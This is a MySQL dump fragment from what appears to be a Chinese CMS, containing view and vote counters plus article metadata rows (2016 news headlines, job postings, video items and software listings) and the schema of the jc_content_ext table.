INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (119,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (120,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (121,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (122,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (123,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (124,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (125,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (126,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (127,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (128,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (129,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (130,22,22,22,22,1,1,1,1,0,0,0,0,12,12,12,12,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (131,17,17,17,17,0,0,0,0,0,0,0,0,15,15,15,15,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (132,7,7,7,7,2,2,2,2,0,0,0,0,1,1,1,1,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (140,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0);
INSERT INTO `jc_content_count` (`content_id`,`views`,`views_month`,`views_week`,`views_day`,`comments`,`comments_month`,`comments_week`,`comments_day`,`downloads`,`downloads_month`,`downloads_week`,`downloads_day`,`ups`,`ups_month`,`ups_week`,`ups_day`,`downs`) VALUES (141,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);

#
# Source for table jc_content_ext
#

CREATE TABLE `jc_content_ext` (
  `content_id` int(11) NOT NULL,
  `title` varchar(150) NOT NULL COMMENT '标题',
  `short_title` varchar(150) DEFAULT NULL COMMENT '简短标题',
  `author` varchar(100) DEFAULT NULL COMMENT '作者',
  `origin` varchar(100) DEFAULT NULL COMMENT '来源',
  `origin_url` varchar(255) DEFAULT NULL COMMENT '来源链接',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `release_date` datetime NOT NULL COMMENT '发布日期',
  `media_path` varchar(255) DEFAULT NULL COMMENT '媒体路径',
  `media_type` varchar(20) DEFAULT NULL COMMENT '媒体类型',
  `title_color` varchar(10) DEFAULT NULL COMMENT '标题颜色',
  `is_bold` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否加粗',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图片',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图片',
  `type_img` varchar(100) DEFAULT NULL COMMENT '类型图片',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '指定模板',
  `need_regenerate` tinyint(1) NOT NULL DEFAULT '1' COMMENT '需要重新生成静态页',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  `toplevel_date` datetime DEFAULT NULL COMMENT '固顶到期日期',
  `pigeonhole_date` datetime DEFAULT NULL COMMENT '归档日期',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展表';

#
# Dumping data for table jc_content_ext
#

INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (2,'法国尼斯发生汽车冲撞事故 已致75人死上百人伤',NULL,NULL,NULL,NULL,NULL,'2016-07-15 14:47:24',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/15154249ucra.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (7,'震撼的视角！2016年度无人机摄影大赛佳作大赏',NULL,NULL,NULL,NULL,NULL,'2016-07-15 15:33:26',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/151530033koq.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (11,'全国28省遭灾 已投入抗洪抢险777万人次','全国28省遭灾 已投入抗洪抢险777万人次',NULL,NULL,NULL,'据初步统计，截至7月13日，长江中下游湖北、湖南、江西、安徽、江苏等5省堤防巡查防守和抢险共投入62.2万人(含部队3.08万人)，6月30日以来已累计投入抗洪抢险777万人次。','2016-07-15 16:23:32',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (12,'习近平就法国尼斯恐袭事件向法总统致慰问电',NULL,NULL,NULL,NULL,'当地时间2016年7月14日，法国国庆日，据法国媒体报道，法国尼斯一辆货车突然冲击人群发动恐怖袭击，据最新消息称，有84人丧生，目前事故原因仍在进一步调查之中。','2016-07-15 17:22:47',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (13,'中国空军航空兵赴南海常态化战斗巡航',NULL,NULL,NULL,NULL,NULL,'2016-07-19 14:12:48',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/19141129f6g4.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (14,'习近平宁夏考察第一天：长征永远在路上',NULL,NULL,NULL,NULL,'习近平考察宁夏首站到固原，冒雨向红军长征会师纪念碑敬献花篮。','2016-07-19 14:26:30',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/19142033fu5h.jpg',NULL,NULL,0,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (23,'“十一”黄金周凯里地区文化旅游活动精彩纷呈',NULL,NULL,'黔东南新闻网','http://qdnrbs.cn/htmls/shzh/20160913/137451.html',NULL,'2016-09-13 17:16:04',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (27,'“一带一路”：习近平打开的“筑梦空间”',NULL,NULL,NULL,NULL,'【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”','2016-09-22 16:30:13',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23150119m7z0.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (28,'加拿大同意与中国协商引渡条约 转变抵制态度',NULL,NULL,NULL,NULL,'该项目声明，“中国专家将被邀请协助核查不被允许从中国内地来加拿大的人员的身份，”以便将他们遣返回国。','2016-09-22 16:56:46',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/22165418ezkw.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (29,'深圳二手房卖主悔约不服判决 纠集60余人冲击法院',NULL,NULL,NULL,NULL,'新华社深圳9月22日专电（记者孙飞）记者22日从深圳市公安局福田分局获悉，深圳数名二手房卖主，因房价上涨不愿履行协议与买家发生纠纷，并对深圳市中院相关判决不满，聚集60余人前往深圳市中院闹访。','2016-09-23 09:07:33',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (30,'不实名手机号停机在即 移动：不对任何社会渠道授权网络售卡',NULL,NULL,NULL,NULL,'中新网北京9月23日电 (吴涛)中新网从三大运营商处获悉，此前传北京地区未实名手机用户10月15日将被停机，实际是分批执行，10月15日开始，最晚至10月31日截止。','2016-09-23 09:09:41',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (32,'台北故宫将拆除成龙所捐12兽首复制品 成龙回应',NULL,NULL,NULL,NULL,'成龙捐给台北故宫(微博)南院的12生肖兽首，面临斩首命运。','2016-09-23 09:19:38',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23091850z61y.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (33,'亚马逊股价首破800美元大关 市值稳居全球上市公司第四',NULL,NULL,NULL,NULL,'亚马逊的股价在纽约当地时间周四上午首次突破每股800美元大关。亚马逊以3860亿美元的市值稳居全球上市公司第四的位置，仅次于苹果、谷歌(微博)母公司Alphabet和微软','2016-09-23 09:23:39',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23092240hxg8.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (36,'海银系接盘匹凸匹谜局待解：P2P业务惨淡收场 多次被调查',NULL,NULL,NULL,NULL,'9月20日，匹凸匹投资者索赔案开庭，有十多位投资者向匹凸匹发起索赔。今年3月，匹凸匹公告，因未及时披露多项对外重大担保、重大诉讼事项及2013年年报中未披露对外重大事项，证监会对匹凸匹处40万元罚款，对鲜言处30万元罚款。前述投资者认为因虚假陈述行为而受到损失。','2016-09-23 09:40:21',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23093922giys.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (37,'苹果研发神秘新设备：体积类似Apple TV 支持NFC蓝牙',NULL,NULL,NULL,NULL,'近日，美国联邦通信委员会意外曝光了苹果正在研发的一款新设备，其体积类似于苹果机顶盒（Apple TV），具体的用途尚不得而知。','2016-09-23 09:43:34',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/230942139uh5.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (39,'四川理塘县发生4.9级地震 震源深度19千米',NULL,NULL,NULL,NULL,'中国地震台网正式测定：09月23日00时47分在四川甘孜州理塘县（北纬30.09度，东经99.64度）发生4.9级地震，震源深度19千米。','2016-09-23 09:54:17',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23095358y6s6.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (43,'web前端开发人员',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:33:15',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (44,'asp.net开发工程师',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:34:35',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (45,'文案编辑',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:38:39',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (46,'项目经理',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:45:02',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (47,'3k计算机实习生双休',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:47:54',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (48,'急聘Android开发',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:50:04',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (49,'IT公司招软件工程师助理',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:51:13',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (50,'聘网页前端设计3K双休',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:54:56',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (51,'诚聘微信推广专员',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:56:01',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (53,'北京天安门广场“祝福祖国”大花篮吊装完毕',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:19:13','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26101908i5ds.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (55,'墨西哥一油轮失火',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:20:11','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26102008qcao.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (57,'本网记者体验360行之【183】另类“复制”',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:21:19','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26102115joze.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (59,'旅比大熊猫宝宝取名“天宝”',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:22:24','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/261022192w54.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (61,'莫斯科举办国际灯光节',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:29:06','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26102904f2l8.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (63,'宇航员拍摄地球夜景：灯火辉煌灿烂 海水平滑如镜',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:30:05','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26103003hrib.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (69,'腾讯QQ',NULL,NULL,NULL,NULL,NULL,'2016-09-26 16:37:28',NULL,NULL,NULL,0,'/u/cms/www/201609/26164039i3uv.jpg','/u/cms/www/201609/261640457r2n.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (71,'百度云管家',NULL,NULL,NULL,NULL,'百度公司推出的一款云服务产品。支持便捷地查看、上传、下载百度云端各类数据。通过百度云管家存入的文件，不会占用本地空间。上传、下载文件过程更稳定。','2016-09-27 09:47:27',NULL,NULL,NULL,0,'/u/cms/www/201609/27095816s3y8.jpg','/u/cms/www/201609/270958122ljv.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (72,'360杀毒 5.0.0.7092 官方正式版','360杀毒',NULL,NULL,NULL,'专业防护，专心为您。\r\n增强敲诈者病毒查杀，最新木马一网打尽;\r\n优化白名单机制，减少打扰;\r\n完善文件实时防护用户体验。','2016-09-27 10:18:46',NULL,NULL,NULL,0,'/u/cms/www/201609/27101524dxj7.jpg','/u/cms/www/201609/27101514u0i9.jpg','/u/cms/www/201609/27101510bh0o.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (100,'诺亚传说','诺亚传说',NULL,NULL,NULL,'《诺亚传说》是尚游游戏自主研发的大型角色扮演网游，新资料片《诺亚传说前传-亚特兰蒂斯》火爆发布。','2016-10-10 11:09:06',NULL,NULL,NULL,0,'/u/cms/www/201610/10110634gxcz.jpg','/u/cms/www/201610/10110628vfwz.jpg','/u/cms/www/201610/10110654vib6.jpg',NULL,NULL,1,'',NULL,NULL);
